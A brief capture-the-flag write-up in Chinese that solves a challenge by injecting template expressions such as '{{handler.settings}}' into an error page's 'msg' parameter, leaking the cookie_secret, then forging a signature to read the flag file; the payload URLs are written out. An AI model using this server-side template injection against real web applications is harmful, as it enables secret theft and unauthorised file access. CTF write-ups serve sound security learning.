##  (Title)

##  Tools

NULL

##  Steps

* Step 1  
报错时的error参数存在模板注入
```
http://49.4.78.81:30980/error?msg={{1^0}}
```
提交
```
http://49.4.78.81:30980/error?msg={{handler.settings}}
```
可以看到cookie_secret  
伪造签名读取flag
```
http://49.4.78.81:30980/file?filename=/fllllllllllag&signature=7bae09c2c6e2f6aa34df7dbee23db960
```




